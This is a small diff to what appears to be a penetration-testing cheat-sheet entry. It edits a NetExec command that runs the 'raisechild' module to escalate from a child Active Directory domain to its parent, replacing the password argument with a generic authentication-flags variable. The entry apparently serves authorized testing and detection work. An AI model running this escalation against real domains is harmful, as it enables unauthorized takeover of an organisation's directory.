@@ -337,12 +337,12 @@ import passwords
 Run the NetExec raisechild module against a child domain.
 
 ```sh title:"Raise child domain to parent with NetExec"
-nxc ldap "$domain" -u "$user" -p "$pass" -M raisechild
+nxc ldap "$domain" -u "$user" $auth_flags -M raisechild
 ```
 <!-- cheat
 import domain_ip
 import users
-import passwords
+import nxc_auth
 -->
 
 ## Detection
